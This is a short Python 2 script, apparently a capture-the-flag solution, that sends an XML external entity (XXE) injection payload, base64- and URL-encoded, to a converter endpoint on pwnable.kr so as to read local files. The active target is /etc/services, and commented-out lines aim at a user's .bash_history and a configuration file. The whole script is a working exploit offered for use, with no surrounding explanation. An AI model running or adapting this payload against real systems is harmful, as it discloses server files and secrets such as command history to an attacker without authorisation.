import requests
from urllib import quote
import base64, json
#file:///etc/converter/converter.conf~
# payload = "file:///home/vuln/.bash_history"
payload = "file:///etc/services"
payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'+payload+'">]><root><subject>&xxe;</subject></root>'
payload = quote(base64.b64encode(payload))
payload = "mail="+payload
#print payload
url = "http://pwnable.kr:8080/converter/convert/contact"

header = {"Content-Type":"application/x-www-form-urlencoded"}

r = requests.post(url, data=payload, headers=header)

print r.text